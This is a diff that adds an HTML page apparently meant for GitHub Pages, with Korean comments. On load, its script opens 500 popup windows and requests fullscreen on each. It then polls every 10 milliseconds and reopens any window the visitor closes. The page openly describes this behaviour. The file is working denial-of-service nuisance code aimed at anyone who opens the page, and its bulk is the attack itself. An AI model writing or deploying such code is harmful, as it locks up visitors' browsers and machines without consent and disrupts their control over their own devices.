@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>500 Full-Screen Windows</title>
+  <script>
+    let reopenedWindows = [];
+
+    function openNewWindow() {
+      // 500개의 새 창을 열고 전체화면으로 설정하기
+      for (let i = 0; i < 500; i++) {
+        let newWindow = window.open(
+          '',
+          'reopenWindow' + i,
+          'width=screen.width,height=screen.height,scrollbars=yes,resizable=yes'
+        );
+        if (newWindow) {
+          newWindow.document.write('<h1>이 창을 닫아도 500개의 창이 다시 열리며 전체화면으로 표시됩니다!</h1>');
+          try {
+            newWindow.document.body.style.margin = '0';
+            newWindow.document.body.style.padding = '0';
+            newWindow.document.body.style.backgroundColor = '#000'; // 배경을 검은색으로 설정
+            newWindow.document.documentElement.style.height = '100%';
+            newWindow.document.body.style.height = '100%';
+            newWindow.document.documentElement.requestFullscreen ? newWindow.document.documentElement.requestFullscreen() : newWindow.document.documentElement.mozRequestFullScreen ? newWindow.document.documentElement.mozRequestFullScreen() : newWindow.document.documentElement.webkitRequestFullScreen();
+          } catch (e) {
+            console.error('전체화면 요청 실패:', e);
+          }
+          reopenedWindows.push(newWindow);
+        } else {
+          alert('팝업 차단이 활성화되어 있습니다. 팝업 차단을 해제하세요.');
+        }
+      }
+    }
+
+    function monitorWindows() {
+      // 각 창이 닫혔는지 감시
+      for (let i = 0; i < reopenedWindows.length; i++) {
+        if (reopenedWindows[i].closed) {
+          reopenedWindows[i] = window.open(
+            '',
+            'reopenWindow' + i,
+            'width=screen.width,height=screen.height,scrollbars=yes,resizable=yes'
+          );
+          reopenedWindows[i].document.write('<h1>이 창을 닫아도 다시 열립니다!</h1>');
+          try {
+            reopenedWindows[i].document.body.style.margin = '0';
+            reopenedWindows[i].document.body.style.padding = '0';
+            reopenedWindows[i].document.body.style.backgroundColor = '#000';
+            reopenedWindows[i].document.documentElement.style.height = '100%';
+            reopenedWindows[i].document.body.style.height = '100%';
+            reopenedWindows[i].document.documentElement.requestFullscreen ? reopenedWindows[i].document.documentElement.requestFullscreen() : reopenedWindows[i].document.documentElement.mozRequestFullScreen ? reopenedWindows[i].document.documentElement.mozRequestFullScreen() : reopenedWindows[i].document.documentElement.webkitRequestFullScreen();
+          } catch (e) {
+            console.error('전체화면 요청 실패:', e);
+          }
+        }
+      }
+      setTimeout(monitorWindows, 10); // 0.01초 간격으로 확인
+    }
+
+    window.onload = function () {
+      openNewWindow(); // 페이지 로드 시 500개의 창 열기
+      monitorWindows(); // 창 상태 감시 시작
+    };
+  </script>
+</head>
+<body>
+  <h1>GitHub Pages Test</h1>
+  <p>이 페이지는 500개의 창을 열고, 각 창이 닫히면 다시 열리며 **전체화면**으로 표시됩니다.</p>
+</body>
+</html>
